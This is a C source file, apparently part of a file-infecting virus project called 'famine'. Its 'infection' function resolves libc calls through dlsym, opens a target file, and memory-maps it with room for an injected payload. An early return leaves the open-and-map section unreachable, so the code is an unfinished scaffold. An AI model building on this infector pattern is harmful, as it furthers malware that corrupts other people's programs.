#include "famine.h"

int  infection(void *(*dlsym)(void *, const char *), void *handle, struct bfile *file,
const char *dirname,  const char *filename, const char *payload) {
  void    *(*malloc)(size_t);
  char    *(*strcpy)(char *, const char *);
  char    *(*strcat)(char *, const char *);
  size_t  (*strlen)(const char *);
  int     (*open)(const char *, int);
  int     (*close)(int);
  void    (*free)(void *);
  int     (*fstat)(int, struct stat *);
  void    *(*mmap)(void *, size_t, int, int, int, off_t);
  char    mallocName[] = "malloc";
  char    strcpyName[] = "strcpy";
  char    strcatName[] = "strcat";
  char    strlenName[] = "strlen";
  char    openName[] = "open";
  char    closeName[] = "close";
  char    freeName[] = "free";
  char    fstatName[] = "fstat";
  char    mmapName[] = "mmap";

  malloc = dlsym(handle, mallocName);
  strcpy = dlsym(handle, strcpyName);
  strcat = dlsym(handle, strcatName);
  open = dlsym(handle, openName);
  close = dlsym(handle, closeName);
  free = dlsym(handle, freeName);
  fstat = dlsym(handle, fstatName);
  mmap = dlsym(handle, mmapName);
  strlen = dlsym(handle, strlenName);

  return (0);
  int         fd;
  char        *tmp;
  struct stat stats;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  if (fstat(fd, &stats) == -1) {
    close(fd);
    return (-1);
  }
  file->size = stats.st_size;
  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  close(fd);
  return (0);
}
